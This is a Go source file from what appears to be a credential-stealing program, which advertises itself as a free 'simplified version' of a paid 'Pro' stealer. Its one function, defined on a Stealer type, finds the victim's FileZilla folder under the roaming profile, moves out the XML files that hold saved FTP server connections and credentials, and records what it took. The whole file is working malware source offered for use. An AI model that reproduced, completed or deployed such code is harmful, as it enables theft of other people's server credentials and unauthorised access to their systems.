// DO NOT EDIT THIS FILE!

// This program is a simplified version with lesser functionality in comparison to the Pro version.
// The source code for the Pro/Premium version is currently private, but may be released in the future.

package main

import (
	"os"
	"strings"
)

type FileZilla struct {
	FilesExtracted []File
}

func (stealer *Stealer) GetFileZillaConnections() {
	// Copy all XML files from the FileZilla path to the Output directory
	var extractedFiles []File

	var fileZillaOutputPath = CleanPath(outputPath + "\\FileZilla")
	if os.Mkdir(fileZillaOutputPath, 0666) != nil {
		return
	}

	serverFiles := GetFiles(fileZillaPath)

	for _, file := range serverFiles {
		filePath := CleanPath(fileZillaOutputPath + "\\" + file.Name)
		if strings.Contains(file.Name, ".xml") {
			if file.Move(filePath) {
				extractedFiles = append(extractedFiles, file)
			}
		}
	}

	stealer.Apps.FileZilla.FilesExtracted = extractedFiles
}

var fileZillaPath = roaming + "FileZilla\\"
